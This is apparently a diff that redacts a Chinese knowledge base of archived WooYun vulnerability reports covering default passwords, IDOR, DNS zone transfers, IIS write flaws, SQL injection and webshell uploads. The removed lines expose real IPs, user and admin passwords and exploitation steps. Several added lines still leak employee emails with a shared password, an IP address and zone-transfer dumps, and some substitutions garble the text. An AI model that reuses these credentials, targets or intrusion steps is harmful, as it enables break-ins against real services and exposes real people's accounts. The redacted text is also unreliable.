+**详情**: "status": "up","ip": "[IP已脱敏]","Domain": ["www.kuaidadi.com"],"Ports": [{"WyVul": [],"protocol": "tcp","state": "open","portid": "21","Service": {"method": "probed","srvName": "ftp","srvProduct": "vsftpd","srvVersion": "2.2.2"}},{"WyVul": [],"protocol": "tcp","state": "open","portid": "80","Service": {"method": "probed","srvName": "http","srvProduct": "nginx","srvVersion": "1.2.8"}},{"WyVul
 
 **POC**: (见原文)
 
@@ -4958,9 +4958,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: zebra路由软件:115.236.77.202: 2601默认口令:zebra115.236.77.202: 2604默认口令:zebra
+**详情**: zebra路由软件:[IP已脱敏]: 2601默认口令:zebra115.236.77.202: 2604默认口令:zebra
 
-**POC**: 特权模式:默认口令:zebra北京的一个zebra OSPF也是默认口令:114.112.194.13 2604默认口令:zebra
+**POC**: 特权模式:默认口令:zebra北京的一个zebra OSPF也是默认口令:[IP已脱敏] 2604默认口令:zebra
 
 **绕过**: 直接利用
 
@@ -5046,9 +5046,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 激光雷达大气遥感研究中心http://113.200.215.173:8080/存在iis可写漏洞
+**详情**: 激光雷达大气遥感研究中心http://[IP已脱敏]
 
-**POC**: http://113.200.215.173:8080/20141111091150.asp;.txt密码z
+**POC**: http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -5068,9 +5068,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: img http://www.hicn.com.cn/Home/Index漏洞存在于：http://www.hicn.com.cn/member/DomainManage/OrderInfo?id=164265ID没有任何密码记住，重新登录即可~~比如当前用户是客户ID：44094登陆密码：UkqvKBvN登录看看成功登录id没有任何加密，替换可查询下一位用户密码http://www.hicn.com.cn/member/DomainManage/OrderInfo?id=164266<
+**详情**: img https://example.com/[已脱敏]
 
-**POC**: http://www.hicn.com.cn/member/DomainManage/OrderInfo?id=164268查到了密码，返回登录即可~~~
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -5112,7 +5112,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: # 安装向导，可以指定一个UCenter，重新安装覆盖掉现有数据http://zhidao.www.dianping.com/uc_client/install/?language=simplified_chinese_utf8# 坑爹的UC_SERVER后台http://zhidao.www.dianping.com/uc_server/admin.php?m=user&a=login&iframe=&sid=
+**详情**: # 安装向导，可以指定一个UCenter，重新安装覆盖掉现有数据https://example.com/[已脱敏] 坑爹的UC_SERVER后台https://example.com/[已脱敏]
 
 **POC**: # 不敢指定自己的UCENTER测试，怕破坏掉你们的数据。
 
@@ -5144,8 +5144,8 @@
 ---
 
 ---
-### [wooyun-2015-0116557] iPhone特殊字符可造成ios微信及qq闪退
-**厂商**: 腾讯 | **年份**: 2015 | **类型**: 默认配置不当
+### [wooyun-2015-0116557] iPhone特殊字符可造成ios某互联网公司及某互联网公司闪退
+**厂商**: 某互联网公司 | **年份**: 2015 | **类型**: 默认配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -5178,7 +5178,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://kuaidadi.com/tax123_db_last.sqlhttp://kuaidadi.com/admin/login.htmlmackesadmin888ip是限制的
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -5189,7 +5189,7 @@
 
 ---
 ### [wooyun-2012-09968] soso分站爆根路径
-**厂商**: 腾讯 | **年份**: 2012 | **类型**: 应用配置错误
+**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: 应用配置错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -5200,7 +5200,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://biaozhu.soso.com/models/poppy/poppy_client.php
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -5266,7 +5266,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 主要原理跟这个相同。WooYun: 百度输入法调用CreateProcess函数漏洞bluestacks  android模拟器，默认的安装路径是C:\Program Files (x86)\BlueStacks。默认是有一些开机启动的服务的。如果有c:\program.exe文件存在。那么开机服务实际启动的就会是这个program.exe。另外。我的win7系统上每次开机都会提示这个文件存在可能对系统造成影响询问是否为这个c:\program.exe改名。这个东西估计也是被微软算作特性的东西吧。
+**详情**: 主要原理跟这个相同。WooYun: 某搜索引擎输入法调用CreateProcess函数漏洞bluestacks  android模拟器，默认的安装路径是C:\Program Files (x86)\BlueStacks。默认是有一些开机启动的服务的。如果有c:\program.exe文件存在。那么开机服务实际启动的就会是这个program.exe。另外。我的win7系统上每次开机都会提示这个文件存在可能对系统造成影响询问是否为这个c:\program.exe改名。这个东西估计也是被微软算作特性的东西吧。
 
 **POC**: 我放的program.exe是一个写字板程序，写字板程序的启动参数可以看出来是其实路径是bluestacks的更新服务。
 
@@ -5288,7 +5288,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: TOM JAVAMAIL 应用泄露用户手机号码账户密码等敏感数据JAVAMAIL 应该是属于手机应用吧http://javaemail.tom.com/log/nokiaemail_20120527.log（最前面不懂了）到http://javaemail.tom.com/log/nokiaemail_20120707.log储存用户的 账号密码  手机号码 以及发送的信息 图片IE访问LOG文件有错 建议用火狐
+**详情**: TOM JAVAMAIL 应用泄露用户手机号码账户密码等敏感数据JAVAMAIL 应该是属于手机应用吧https://example.com/[已脱敏] 账号密码  手机号码 以及发送的信息 图片IE访问LOG文件有错 建议用火狐
 
 **POC**: (见原文)
 
@@ -5298,8 +5298,8 @@
 ---
 
 ---
-### [wooyun-2013-024136] 淘宝网Minebdb系统未做权限认证
-**厂商**: 淘宝网 | **年份**: 2013 | **类型**: 系统/服务运维配置不当
+### [wooyun-2013-024136] 某电商平台网Minebdb系统未做权限认证
+**厂商**: 某电商平台网 | **年份**: 2013 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -5310,9 +5310,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: URL：http://110.75.66.47/
+**详情**: URL：http://[IP已脱敏]
 
-**POC**: 这里貌似是很危险的：由于无法验证这些数据库具体是干嘛的 不好判断危害 但肯定是跟淘宝网站有关
+**POC**: 这里貌似是很危险的：由于无法验证这些数据库具体是干嘛的 不好判断危害 但肯定是跟某电商平台网站有关
 
 **绕过**: 直接利用
 
@@ -5332,7 +5332,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 广东省建设工程质量安全监督检测总站OA办公自动化系统http://113.108.183.202/
+**详情**: 广东省建设工程质量安全监督检测总站OA办公自动化系统http://[IP已脱敏]
 
 **POC**: (见原文)
 
@@ -5354,7 +5354,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 天天果园冷库供应链http://www.5150w.cn/业账号:fruitday用户名:admin密码:123456温控后台http://lengku.5150w.cn/账号：ttxg密码：000000ok
+**详情**: 天天果园冷库供应链https://example.com/[已脱敏]
 
 **POC**: ···
 
@@ -5376,7 +5376,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.letv.com/crossdomain.xml<cross-domain-policy><allow-access-from domain="*"/></cross-domain-policy>
+**详情**: https://example.com/[已脱敏] domain="*"/></cross-domain-policy>
 
 **POC**: <cross-domain-policy><allow-access-from domain="*"/></cross-domain-policy>
 
@@ -5398,7 +5398,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 美菜后台http://119.90.53.178:9999/    产品相关的账号密码打包：36	gangchunhua@yunshanmeicai.com	meicai123	302	false	false	32846	yaolongyin@yunshanmeicai.com	meicai123	302	false	false	32848	wangpengyu@yunshanmeicai.com	meicai123	302	false	false	32849	yaoqiang@yunshanmeicai.com	meicai123	302	false	false	32867	yaodanxu@yunshanmeicai.com	meicai123	302	false	false	32878	hanxiaofen@yunshanmeicai.com	meicai123	302	false	
+**详情**: 美菜后台http://[IP已脱敏]    产品相关的账号密码打包：36	gangchunhua@yunshanmeicai.com	meicai123	302	false	false	32846	yaolongyin@yunshanmeicai.com	meicai123	302	false	false	32848	wangpengyu@yunshanmeicai.com	meicai123	302	false	false	32849	yaoqiang@yunshanmeicai.com	meicai123	302	false	false	32867	yaodanxu@yunshanmeicai.com	meicai123	302	false	false	32878	hanxiaofen@yunshanmeicai.com	meicai123	302	false	
 
 **POC**: ···
 
@@ -5420,7 +5420,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://221.214.117.211:7501/存在iis写权限漏洞先put再move导致整站沦陷
+**详情**: http://[IP已脱敏]
 
 **POC**: (见原文)
 
@@ -5444,7 +5444,7 @@
 
 **详情**: 0x00.恶意用户可以通过dns域传送获取被攻击域下所有的子域名。会导致一些非公开域名（测试域名、内部域名）泄露。而泄露的类似内部域名，其安全性相对较低，更容易遭受攻击者的攻击，比较典型的譬如内部的测试机往往就会缺乏必要的安全设置.该配置不当的DNS Server为：dns2.etone.edu.cn
 
-**POC**: shop.edu.cn. IN AXFR;ANSWERshop.edu.cn. 86400 IN SOA shop.edu.cn. qikw.cernet.com. 2015052201 86400 3600 604800 10800shop.edu.cn. 86400 IN MX 10 mail.shop.edu.cn.shop.edu.cn. 86400 IN NS dns1.etone.edu.cn.shop.edu.cn. 86400 IN NS dns2.etone.edu.cn.shop.edu.cn. 86400 IN TXT "v=spf1 ip4:59.64.112.160 
+**POC**: shop.edu.cn. IN AXFR;ANSWERshop.edu.cn. 86400 IN SOA shop.edu.cn. qikw.cernet.com. 2015052201 86400 3600 604800 10800shop.edu.cn. 86400 IN MX 10 mail.shop.edu.cn.shop.edu.cn. 86400 IN NS dns1.etone.edu.cn.shop.edu.cn. 86400 IN NS dns2.etone.edu.cn.shop.edu.cn. 86400 IN TXT "v=spf1 ip4:[IP已脱敏] 
 
 **绕过**: 直接利用
 
@@ -5464,13 +5464,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.cyberpolice.cnchangchun                      A      61.138.176.93changdu                        A      220.182.3.22www.changdu                    A      220.182.3.22changsha                       A      202.103.69.62chaohu                         A      60.174.198.9www.chaohu                     A      220.180.245.12chengdu                        A      218.6.168.107chifeng             
+**详情**: https://example.com/[已脱敏]                      A      [IP已脱敏]changdu                        A      [IP已脱敏]www.changdu                    A      [IP已脱敏]changsha                       A      [IP已脱敏]chaohu                         A      [IP已脱敏]www.chaohu                     A      [IP已脱敏]chengdu                        A      [IP已脱敏]chifeng             
 
-**POC**: http://www.cyberpolice.cnchangchun                      A      61.138.176.93changdu                        A      220.182.3.22www.changdu                    A      220.182.3.22changsha                       A      202.103.69.62chaohu                         A      60.174.198.9www.chaohu             
+**POC**: https://example.com/[已脱敏]                      A      [IP已脱敏]changdu                        A      [IP已脱敏]www.changdu                    A      [IP已脱敏]changsha                       A      [IP已脱敏]chaohu                         A      [IP已脱敏]www.chaohu             
 
 **绕过**: 直接利用
 
-**修复**: http://tech.huweishen.com/loudong/971.html 参见,或者找专业人员~
+**修复**: https://example.com/[已脱敏] 参见,或者找专业人员~
 ---
 
 ---
@@ -5486,7 +5486,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://app.finance.ifeng.com/admin/login.php
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -5508,7 +5508,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.tianlian.com我们直接 忘记密码国内我估计很多大型门户网站都存在此类漏洞首先admin提交这时候到这一步，我们需要再注册1个会员，admin这个页面不要动停留我已经注册好了这时候给自己发短信验证接收的验证码，弄到ADMIN这里直接重置为7788250aa吧直接沦陷登录看看直接管理员权限
+**详情**: https://example.com/[已脱敏] 忘记密码国内我估计很多大型门户网站都存在此类漏洞首先admin提交这时候到这一步，我们需要再注册1个会员，admin这个页面不要动停留我已经注册好了这时候给自己发短信验证接收的验证码，弄到ADMIN这里直接重置为7788250aa吧直接沦陷登录看看直接管理员权限
 
 **POC**: (见原文)
 
@@ -5574,7 +5574,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 地铁十号线未开启安全锁，导致可以使用“智能遥控”http://mobile.pconline.com.cn/497/4978538_7.html 控制电视
+**详情**: 地铁十号线未开启安全锁，导致可以使用“智能遥控”https://example.com/[已脱敏] 控制电视
 
 **POC**: 十号线：图为电视的菜单，可修改可随意切换信号源，修改音量，开启推箱子、贪吃蛇游戏等
 
@@ -5596,7 +5596,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.google.com.hk/#q=inurl:*backupdata*dede_admin&hl=zh-CN&newwindow=1&safe=strict&prmd=imvns&ei=U_dCT7WpOIe9iAe1qpDlBA&start=10&sa=N&bav=on.2,or.r_gc.r_pw.,cf.osb&fp=1fcd94471d9bb062&biw=1280&bih=659
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -5618,9 +5618,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://apitest.qufenqi.com/相关链接：http://zone.wooyun.org/content/1060
+**详情**: https://example.com/[已脱敏]
 
-**POC**: 系统版本：passwd文件...这里后续读了nginx配置文件，access日志 error日志，发现竟然没有爆出路径于是自己去找一处报错：http://apitest.qufenqi.com/shop?cate_id[]=133发现存在路径，尝试去read一下：fcgi_exp.exe read 123.56.104.144 9000 /home/apple/qufenqi_api/public/index.php发现是html页面，这与zone中的解释是相符合的 实质上他是去执行了这个php文件于是尝试读取在log中弄过phpinfo测试下：133.130.53.194 - - [24/N
+**POC**: 系统版本：passwd文件...这里后续读了nginx配置文件，access日志 error日志，发现竟然没有爆出路径于是自己去找一处报错：https://example.com/[已脱敏]]=133发现存在路径，尝试去read一下：fcgi_exp.exe read [IP已脱敏] 9000 /home/apple/qufenqi_api/public/index.php发现是html页面，这与zone中的解释是相符合的 实质上他是去执行了这个php文件于是尝试读取在log中弄过phpinfo测试下：[IP已脱敏] - - [24/N
 
 **绕过**: 直接利用
 
@@ -5640,9 +5640,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.yonglibao.com/User/Login如果单独访问http://www.yonglibao.com/User无法触发我们只需要访问http://www.yonglibao.com/User/Index/paypwd即可记忆当前用户无需登录，自动记忆接着，访问他的用户
+**详情**: https://example.com/[已脱敏]
 
-**POC**: http://www.yonglibao.com/User/Index/paypwd
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -5668,7 +5668,7 @@
 
 **绕过**: 直接利用
 
-**修复**: http://drops.wooyun.org/papers/865 Memcache安全配置
+**修复**: https://example.com/[已脱敏] Memcache安全配置
 ---
 
 ---
@@ -5706,7 +5706,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 主要是升级时对升级信息都是明文。这样很容易进行欺骗地址，对明文篡改。地址：http://update.hicloud.com:8180/TDS/data/files/p3/s15/G639/g272/v18037/f1/full/filelist.xmlhttp://update.hicloud.com:8180/TDS/data/files/p3/s15/G639/g272/v18037/f1/full/changelog.xml局域网下就可以更改地址的吧~
+**详情**: 主要是升级时对升级信息都是明文。这样很容易进行欺骗地址，对明文篡改。地址：https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -5717,7 +5717,7 @@
 
 ---
 ### [wooyun-2011-03801] 阿里旺旺域名列目录
-**厂商**: 淘宝网 | **年份**: 2011 | **类型**: 系统/服务运维配置不当
+**厂商**: 某电商平台网 | **年份**: 2011 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -5760,8 +5760,8 @@
 ---
 
 ---
-### [wooyun-2013-023728] 新浪某xx运维统计系统对外
-**厂商**: 新浪 | **年份**: 2013 | **类型**: 系统/服务运维配置不当
+### [wooyun-2013-023728] 某社交平台某xx运维统计系统对外
+**厂商**: 某社交平台 | **年份**: 2013 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -5772,7 +5772,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://livecast.sina.com.cn/infolive/keyonline.php?呵呵么
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -5782,8 +5782,8 @@
 ---
 
 ---
-### [wooyun-2012-08449] 百度HI在线聊天可被网络嗅探获取聊天内容。
-**厂商**: 百度 | **年份**: 2012 | **类型**: 应用配置错误
+### [wooyun-2012-08449] 某搜索引擎HI在线聊天可被网络嗅探获取聊天内容。
+**厂商**: 某搜索引擎 | **年份**: 2012 | **类型**: 应用配置错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -5796,7 +5796,7 @@
 
 **详情**: 今天在聊天的时候发现的。。典型url加密，用户的隐私啊，赤裸裸的都被泄密了
 
-**POC**: 看图吧http://www.baidu.com/s?wd=%D4%F5%C3%B4%BB%E1%B9%D8%C3%C5%3F%BF%AA%C1%CB%B6%E0%BE%C3%B0%A1%3F+%D4%DA%C9%EE%DB%DA%BF%AA%B5%C4%3F
+**POC**: 看图吧https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -5816,7 +5816,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: > nslookup默认服务器:  localhostAddress:  192.168.0.1> set type=ns> taikang.com服务器:  localhostAddress:  192.168.0.1非权威应答:taikang.com     nameserver = pns.taikang.comtaikang.com     nameserver = sns.taikang.com> server pns.taikang.com默认服务器:  pns.taikang.comAddress:  116.58.220.10> ls taikang.com[pns.taikang.com]taikang.com.                   A      116.58.220.1taikang.com.                   NS     serve
+**详情**: > nslookup默认服务器:  localhostAddress:  [IP已脱敏]> set type=ns> taikang.com服务器:  localhostAddress:  [IP已脱敏]非权威应答:taikang.com     nameserver = pns.taikang.comtaikang.com     nameserver = sns.taikang.com> server pns.taikang.com默认服务器:  pns.taikang.comAddress:  [IP已脱敏]> ls taikang.com[pns.taikang.com]taikang.com.                   A      [IP已脱敏]taikang.com.                   NS     serve
 
 **POC**: (见原文)
 
@@ -5838,9 +5838,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 中共寿光市委党务公开网存在install重装漏洞。http://dwgk.shouguang.gov.cn/install/
+**详情**: 中共寿光市委党务公开网存在install重装漏洞。https://example.com/[已脱敏]
 
-**POC**: 中共寿光市委党务公开网存在install重装漏洞。http://dwgk.shouguang.gov.cn/install/
+**POC**: 中共寿光市委党务公开网存在install重装漏洞。https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -5860,7 +5860,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 目标：mrtg.yxdown.com -> 120.131.70.11：873 rsync 服务配置不当 可上传文件 估计也可下载没下载任何东西1.列目录2.上传文件
+**详情**: 目标：mrtg.yxdown.com -> [IP已脱敏]：873 rsync 服务配置不当 可上传文件 估计也可下载没下载任何东西1.列目录2.上传文件
 
 **POC**: 如上
 
@@ -5884,7 +5884,7 @@
 
 **详情**: 天翼移动阅读后台暴露
 
-**POC**: http://61.130.247.178:8080/ReadPlatform/
+**POC**: http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -5904,9 +5904,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 0x1：dns传送漏洞地址：http://www.ettoday.net/0x2：dns数据：; <<>> DiG 9.8.3-P1 <<>> @ns1.ettoday.net. axfr ettoday.net; (1 server found);; global options: +cmdettoday.net.		3600	IN	SOA	ns1.ettoday.net. admin.ettoday.net. 2015030501 10800 3600 1209600 38400ettoday.net.		3600	IN	TXT	"v=spf1 ip4:219.85.79.135 include:_spf.google.com ~all"ettoday.net.		3600	IN	MX	10 mail.ettoday.net.ettoday.net.		3600	IN	MX	20 ma
+**详情**: 0x1：dns传送漏洞地址：https://example.com/[已脱敏] <<>> DiG 9.8.3-P1 <<>> @ns1.ettoday.net. axfr ettoday.net; (1 server found);; global options: +cmdettoday.net.		3600	IN	SOA	ns1.ettoday.net. admin.ettoday.net. 2015030501 10800 3600 1209600 38400ettoday.net.		3600	IN	TXT	"v=spf1 ip4:[IP已脱敏] include:_spf.google.com ~all"ettoday.net.		3600	IN	MX	10 mail.ettoday.net.ettoday.net.		3600	IN	MX	20 ma
 
-**POC**: 0x1：dns传送漏洞地址：http://www.ettoday.net/0x2：dns数据：; <<>> DiG 9.8.3-P1 <<>> @ns1.ettoday.net. axfr ettoday.net; (1 server found);; global options: +cmdettoday.net.		3600	IN	SOA	ns1.ettoday.net. admin.ettoday.net. 2015030501 10800 3600 1209600 38400ettoday.net.		3600	IN	TXT	"v=spf1 ip4:219.85.79.135 incl
+**POC**: 0x1：dns传送漏洞地址：https://example.com/[已脱敏] <<>> DiG 9.8.3-P1 <<>> @ns1.ettoday.net. axfr ettoday.net; (1 server found);; global options: +cmdettoday.net.		3600	IN	SOA	ns1.ettoday.net. admin.ettoday.net. 2015030501 10800 3600 1209600 38400ettoday.net.		3600	IN	TXT	"v=spf1 ip4:[IP已脱敏] incl
 
 **绕过**: 直接利用
 
@@ -5926,7 +5926,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 100offer标题是为了安全，其实是被me发现了一个注入~商务合作：cjy@100offer.com招聘体验师：fairywang@100offer.com意见与投诉：fan@100offer.com邀请朋友注册100offer.com, 您可以立即获得 15元亚马逊礼品卡或 1500元介绍奖金。送我奖金呢还是礼品卡呢~点：https://100offer.com/company_list?l=A   唯一的点web application technology: Nginxback-end DBMS: MySQL 5.0.11available databases [8]:[*] db1s8z72o9v2c844[*] information_schema[*] jiguang_production[*] jiguang_staging[*] jiguanghr[*] mysql[*]
+**详情**: 100offer标题是为了安全，其实是被me发现了一个注入~商务合作：cjy@100offer.com招聘体验师：fairywang@100offer.com意见与投诉：fan@100offer.com邀请朋友注册100offer.com, 您可以立即获得 15元亚马逊礼品卡或 1500元介绍奖金。送我奖金呢还是礼品卡呢~点：https://example.com/[已脱敏]   唯一的点web application technology: Nginxback-end DBMS: MySQL 5.0.11available databases [8]:[*] db1s8z72o9v2c844[*] information_schema[*] jiguang_production[*] jiguang_staging[*] jiguanghr[*] mysql[*]
 
 **POC**: 如上
 
@@ -5948,9 +5948,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: svn://119.145.9.169/dbank/web/trunk/webserver/WebContent/filesvn://119.145.9.169/dbank/web/trunk/webserver/WebContent/pc
+**详情**: svn://[IP已脱敏]
 
-**POC**: svn://119.145.9.169/dbank/web/trunk/webserver/WebContent/filesvn://119.145.9.169/dbank/web/trunk/webserver/WebContent/pc
+**POC**: svn://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -5970,7 +5970,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 长沙市建设工程质量监督站http://csjszj.cn/test.txt
+**详情**: 长沙市建设工程质量监督站https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -5994,7 +5994,7 @@
 
 **详情**: 收集的子域名, 无意中得到的server ns1.hnair.comls -d hnair.com
 
-**POC**: > server ns1.hnair.com默认服务器:  ns1.hnair.comAddress:  202.100.200.53> ls -d hnair.com[ns1.hnair.com]hnair.com.                     SOA    ns1.hnair.com hostmaster.ns1.hnair.com. (2014031205 28800 7200 604800 86400)hnair.com.                     NS     ns1.hnair.comhnair.com.                     NS   
+**POC**: > server ns1.hnair.com默认服务器:  ns1.hnair.comAddress:  [IP已脱敏]> ls -d hnair.com[ns1.hnair.com]hnair.com.                     SOA    ns1.hnair.com hostmaster.ns1.hnair.com. (2014031205 28800 7200 604800 86400)hnair.com.                     NS     ns1.hnair.comhnair.com.                     NS   
 
 **绕过**: 直接利用
 
@@ -6036,7 +6036,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: <http://jpkc.hustwb.edu.cn/dgdz/news_show.asp?id=207 >注入点获取后台账户通过FKC的漏洞成上传一句话木马，获取了服务器权限。在服务器目录下找到教务系统源码备份，获取数据库root权限，在主站http://jwc.hustwb.edu.cn/找到数据库后台phpmyadmin登陆，直接影响全部数据
+**详情**: <https://example.com/[已脱敏] >注入点获取后台账户通过FKC的漏洞成上传一句话木马，获取了服务器权限。在服务器目录下找到教务系统源码备份，获取数据库root权限，在主站https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -6082,7 +6082,7 @@
 
 **详情**: 
 
-**POC**: http://vip.club.sohu.com/wenwang/question/index.php
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -6102,7 +6102,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 看标题，不解释，官网：http://www.fat.com.tw/index/index.aspx; <<>> DiG 9.8.3-P1 <<>> @dns2.fat.com.tw. axfr fat.com.tw; (1 server found);; global options: +cmdfat.com.tw.		3600	IN	SOA	dns2.fat.com.tw. hostmaster.fat.com.tw. 50 900 600 86400 3600fat.com.tw.		3600	IN	NS	dns.fat.com.tw.fat.com.tw.		3600	IN	NS	dns2.fat.com.tw.fat.com.tw.		3600	IN	MX	10 spam.fat.com.tw.agent.fat.com.tw.	3600	IN	A	61.218.88.82ap.f
+**详情**: 看标题，不解释，官网：https://example.com/[已脱敏] <<>> DiG 9.8.3-P1 <<>> @dns2.fat.com.tw. axfr fat.com.tw; (1 server found);; global options: +cmdfat.com.tw.		3600	IN	SOA	dns2.fat.com.tw. hostmaster.fat.com.tw. 50 900 600 86400 3600fat.com.tw.		3600	IN	NS	dns.fat.com.tw.fat.com.tw.		3600	IN	NS	dns2.fat.com.tw.fat.com.tw.		3600	IN	MX	10 spam.fat.com.tw.agent.fat.com.tw.	3600	IN	A	[IP已脱敏]ap.f
 
 **POC**: (见原文)
 
@@ -6124,18 +6124,18 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 原标题：平安银行域名DNS记录没有txt类型的spf记录登记邮件服务器IP可伪造（*@pingan.com.cn）、（*@pingan.com）发邮件，用户无感知域名pingan.com所有者联系邮箱LIQQ@PINGAN.COM.CN域名pingan.com.cn所有者联系邮箱pub_dns@pingan.com.cn（我是匿名发布漏洞的耶，这图片好像泄漏了什么）高大上！自建邮局！！pingan.com和pingan.com.cn有MX记录，且还是自建邮局，说明（@pingan.com.cn）、（@pingan.com）用于收发邮件但是pingan.com和pingan.com.cn域名的DNS记录没有txt类型的spf记录登记邮件服务器IP，可伪造@pingan.com.cn、@pingan.com发邮件
+**详情**: 原标题：平安银行域名DNS记录没有txt类型的spf记录登记邮件服务器IP可伪造（*@pingan.com.cn）、（*@pingan.com）发邮件，用户无感知域名pingan.com所有者联系邮箱LI某互联网公司@PINGAN.COM.CN域名pingan.com.cn所有者联系邮箱pub_dns@pingan.com.cn（我是匿名发布漏洞的耶，这图片好像泄漏了什么）高大上！自建邮局！！pingan.com和pingan.com.cn有MX记录，且还是自建邮局，说明（@pingan.com.cn）、（@pingan.com）用于收发邮件但是pingan.com和pingan.com.cn域名的DNS记录没有txt类型的spf记录登记邮件服务器IP，可伪造@pingan.com.cn、@pingan.com发邮件
 
 **POC**: 伪造pub_dns@pingan.com.cn搭建一个邮局服务器添加域名pingan.com.cn添加用户pub_dns发邮件（给自己）（我是匿名发布漏洞的耶，图片貌似泄漏了什么）
 
 **绕过**: 直接利用
 
-**修复**: 求礼物~~送礼物后可以看到修复方案域名的DNS记录添加txt类型的spf记录登记邮件服务器IP可以参考qq.com、163.com、baidu.com等域名spf记录登记邮件服务器的IP地址造成影响：高影响范围：大攻击成本：低
+**修复**: 求礼物~~送礼物后可以看到修复方案域名的DNS记录添加txt类型的spf记录登记邮件服务器IP可以参考某互联网公司.com、163.com、baidu.com等域名spf记录登记邮件服务器的IP地址造成影响：高影响范围：大攻击成本：低
 ---
 
 ---
 ### [wooyun-2011-03581] 阿里某邮件系统服务器配置不当
-**厂商**: 阿里巴巴 | **年份**: 2011 | **类型**: 系统/服务运维配置不当
+**厂商**: 某电商平台 | **年份**: 2011 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -6148,7 +6148,7 @@
 
 **详情**: webdav，可写入文件，虽然安全机制导致写入的文件很快无法访问，但是问题确实是存在的，突破我想也是时间问题。
 
-**POC**: https://mail.alibaba-inc.com/owa/auth/新建网络邻居，加入以上链接，打开后直接拖入文件，IIS6.0，貌似不支持asp，只支持.net，所以无法利用解析漏洞，刚开始的时候拖了几个*.asp;.jpg的文件进去一段时间内可以访问，但是没有解析，后来貌似触发了安全机制，文件写入后很快404。另：同C段有很多阿里的敏感站点，你懂得。
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -6168,7 +6168,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: URL：http://www.npc.gov.cn/
+**详情**: URL：https://example.com/[已脱敏]
 
 **POC**: 泄露信息：; <<>> DiG 9.8.3-P1 <<>> @ns.npc.gov.cn. axfr npc.gov.cn; (1 server found);; global options: +cmdnpc.gov.cn.		86400	IN	SOA	ns.npc.gov.cn. root.npc.gov.cn. 1 3600 600 86400 3600npc.gov.cn.		86400	IN	MX	10 smtp.npc.gov.cn.npc.gov.cn.		86400	IN	NS	ns.npc.gov.cn.cms.npc.gov.cn.		86400	IN	A	210.82.3
 
@@ -6222,8 +6222,8 @@
 ---
 
 ---
-### [wooyun-2011-02941] 中国电信网上营业厅某分站 JBoss配置不当造成远程代码执行
-**厂商**: 中国电信 | **年份**: 2011 | **类型**: 系统/服务运维配置不当
+### [wooyun-2011-02941] 某运营商网上营业厅某分站 JBoss配置不当造成远程代码执行
+**厂商**: 某运营商 | **年份**: 2011 | **类型**: 系统/服务运维配置不当
 
